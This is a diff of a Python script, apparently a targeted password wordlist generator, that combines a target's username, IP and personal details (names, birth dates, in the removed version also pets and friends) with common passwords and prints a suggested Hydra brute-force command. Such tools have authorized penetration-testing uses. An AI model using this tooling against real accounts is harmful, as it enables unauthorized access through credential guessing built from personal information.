@@ -1,117 +1,117 @@
 import itertools
+from colorama import Fore, Style, init
 
-# Expanded common passwords list
-common_passwords = [
-    "password", "admin", "qwerty", "123456", "123456789", "letmein", "welcome",
-    "iloveyou", "football", "monkey", "abc123", "sunshine", "princess", "dragon",
-    "passw0rd", "superman", "batman", "trustno1", "hunter2", "hello", "freedom",
-    "shadow", "master", "killer", "ninja", "mustang", "jordan", "monkey123",
-    "qwerty123", "zaq12wsx", "asdfgh", "111111", "666666", "7777777", "password1",
-    "P@ssw0rd", "Pa$$w0rd", "1234abcd", "welcome123", "admin123"
-]
+# Initialize colorama
+init(autoreset=True)
 
-special_chars = ["!", "@", "#", "$", "_", ".", "-", "*"]
+# Common configuration
+service_profiles = {
+    "ssh": {"technical": True, "personal": True, "dates": True},
+    "web": {"technical": False, "personal": True, "dates": True},
+    "ftp": {"technical": True, "personal": False, "dates": False},
+    "router": {"technical": True, "personal": False, "dates": False}
+}
 
-# Function to collect target details
-def get_input(prompt):
+special_chars = ["!", "@", "#", "$", "_", ".", "-", "*", "&", "+", "="]
+common_passwords = [...]  # Keep your existing list
+
+def show_banner():
+    print(f"""{Fore.CYAN}
+╦ ╦┌─┐┬  ┌─┐┌─┐┌┬┐   ╦ ╦┌─┐┬─┐┌─┐┌─┐┌─┐┬ ┬
+║║║├┤ │  │  │ ││││   ╠═╣├─┤├┬┘│  ├┤ └─┐├─┤
+╚╩╝└─┘┴─┘└─┘└─┘┴ ┴   ╩ ╩┴ ┴┴└─└─┘└─┘└─┘┴ ┴
+{Style.RESET_ALL}Kethan VR - Smart Wordlist Generator v2.0
+{Fore.RED}[!] WARNING: Use only for authorized security testing!{Style.RESET_ALL}
+""")
+
+def smart_input(prompt, prev_step=None):
     while True:
-        value = input(prompt)
-        if value == "99":
-            print("\n❌ Exiting script...")
-            exit()
-        elif value == "0":
-            return None  # Skip this step
-        else:
+        try:
+            value = input(prompt)
+            if value == "99":
+                print("\n🔴 Exiting...")
+                exit()
+            elif value == "0" and prev_step:
+                return "BACK"
             return value.strip()
+        except KeyboardInterrupt:
+            print("\n🔴 Operation cancelled!")
+            exit()
 
-print("🔹 Smart Multi-Level Wordlist Generator 🔹")
-print("💡 Enter details or press 0 to skip, 99 to quit.")
+def generate_combinations(base_words, service_type):
+    combinations = set()
+    
+    # Basic variations
+    combinations.update(base_words)
+    
+    # Service-specific generation
+    if service_type in ["ssh", "router"]:
+        # Technical combinations
+        for combo in itertools.product(base_words, ["123", "321", "admin", "root"]):
+            combinations.add(''.join(combo))
+    elif service_type == "web":
+        # Personal combinations
+        for combo in itertools.product(base_words, ["pw", "pass", "secret", "2024"]):
+            combinations.add(''.join(combo))
+    
+    # Advanced permutations
+    for r in range(1, 3):
+        for combo in itertools.permutations(base_words, r):
+            combinations.add(''.join(combo))
+    
+    # Special character variations
+    for word in base_words:
+        for char in special_chars:
+            combinations.add(f"{word}{char}")
+            combinations.add(f"{char}{word}")
+    
+    return combinations
 
-target_info = {}
+def main_flow():
+    show_banner()
+    target_info = {}
+    
+    # Service detection
+    while True:
+        service = smart_input("🌐 Enter target service type (ssh/web/ftp/router): ").lower()
+        if service in service_profiles:
+            target_info["service_profile"] = service_profiles[service]
+            break
+        print(f"{Fore.RED}Invalid service! Choose from {list(service_profiles.keys())}")
+    
+    # Dynamic questioning
+    sections = [
+        ("🖥️ Enter target IP: ", "host_ip", True),
+        ("👤 Enter known username: ", "username", target_info["service_profile"]["technical"]),
+        ("1️⃣ Enter first name: ", "first_name", target_info["service_profile"]["personal"]),
+        ("8️⃣ Enter birth year (YYYY): ", "year", target_info["service_profile"]["dates"])
+    ]
+    
+    for prompt, key, condition in sections:
+        if not condition:
+            continue
+        while True:
+            result = smart_input(prompt, prev_step=True)
+            if result == "BACK":
+                break
+            target_info[key] = result
+            break
+    
+    # Generate wordlist
+    base_words = [v for v in target_info.values() if isinstance(v, str)]
+    combinations = generate_combinations(base_words + common_passwords, service)
+    
+    # Save output
+    filename = f"{service}_wordlist.txt"
+    with open(filename, "w") as f:
+        f.write('\n'.join(combinations))
+    
+    print(f"\n✅ Successfully generated {len(combinations)} entries in {filename}")
+    
+    # Hydra command suggestion
+    if 'host_ip' in target_info and 'username' in target_info:
+        print(f"\n{Fore.GREEN}Suggested Hydra command:{Style.RESET_ALL}")
+        print(f"hydra -l {target_info['username']} -P {filename} {target_info['host_ip']} {service}")
 
-# 🔥 Step 1: Target Host Details
-target_info["host_ip"] = get_input("🖥️ Enter target IP (e.g., 192.168.1.1): ")
-target_info["os"] = get_input("💻 Enter target OS (Windows/Linux/macOS): ")
-target_info["service"] = get_input("🌐 Enter target service (e.g., SSH, FTP, RDP): ")
-target_info["username"] = get_input("👤 Enter known username: ")
-
-# 🏆 Step 2: Personal Details
-target_info["first_name"] = get_input("1️⃣ Enter first name: ")
-target_info["full_name"] = get_input("2️⃣ Enter full name: ")
-target_info["nickname"] = get_input("3️⃣ Enter nickname or username: ")
-
-# 🏡 Step 3: Background & Social Info
-target_info["address"] = get_input("4️⃣ Enter part of address (city, street, etc.): ")
-target_info["social_media"] = get_input("5️⃣ Enter social media username: ")
-
-# 💖 Step 4: Relationships
-target_info["best_friend"] = get_input("6️⃣ Enter best friend’s name: ")
-target_info["pet_name"] = get_input("7️⃣ Enter pet's name: ")
-
-# 📅 Step 5: Key Dates
-target_info["dob"] = get_input("8️⃣ Enter Date of Birth (DDMMYYYY): ")
-target_info["year"] = get_input("9️⃣ Enter birth year (YYYY): ")
-
-# 🎭 Step 6: Interests & Extra Info
-hobbies = get_input("🔟 Enter hobbies (comma-separated): ")
-target_info["hobbies"] = hobbies.split(',') if hobbies else []
-
-# 🔧 Step 7: Special Custom Words
-extra_words = get_input("1️⃣1️⃣ Enter any extra words (comma-separated): ")
-target_info["extra_words"] = extra_words.split(',') if extra_words else []
-
-# 🔥 Ask for a custom wordlist name
-wordlist_name = get_input("📝 Enter wordlist filename (default: custom_wordlist.txt): ")
-if not wordlist_name:
-    wordlist_name = "custom_wordlist.txt"  # Default name
-
-# 🔥 Start generating passwords
-custom_words = []
-
-for key, value in target_info.items():
-    if isinstance(value, list):
-        custom_words.extend(value)  # Add list items
-    elif value:
-        custom_words.append(value)  # Add single value
-
-# Add common passwords to increase effectiveness
-custom_words.extend(common_passwords)
-
-# Generate password variations
-combinations = set()  # Using a set to avoid duplicates
-
-# Simple words
-combinations.update(custom_words)
-
-# Add numbers & special characters
-for word in custom_words:
-    for num in ["123", "1234", "007", "2024", "786"]:
-        combinations.add(word + num)
-        combinations.add(num + word)
-
-    for char in special_chars:
-        combinations.add(word + char)
-        combinations.add(char + word)
-
-# Generate mix of two words
-for combo in itertools.permutations(custom_words, 2):
-    combinations.add("".join(combo))
-
-# Leetspeak variations
-leet_replacements = {"a": "@", "s": "$", "i": "1", "o": "0", "e": "3"}
-for word in custom_words:
-    leet_word = "".join(leet_replacements.get(c, c) for c in word)
-    combinations.add(leet_word)
-
-# Save to the chosen wordlist file
-with open(wordlist_name, "w") as f:
-    for password in combinations:
-        f.write(password + "\n")
-
-print(f"\n✅ Custom wordlist saved as: {wordlist_name}")
-print(f"🔹 Total passwords generated: {len(combinations)}")
-
-# Suggested Hydra command for brute-force attack
-if target_info["host_ip"] and target_info["service"] and target_info["username"]:
-    print("\n🔥 Use this Hydra command to start cracking:")
-    print(f"hydra -l {target_info['username']} -P {wordlist_name} {target_info['host_ip']} {target_info['service']}")
+if __name__ == "__main__":
+    main_flow()
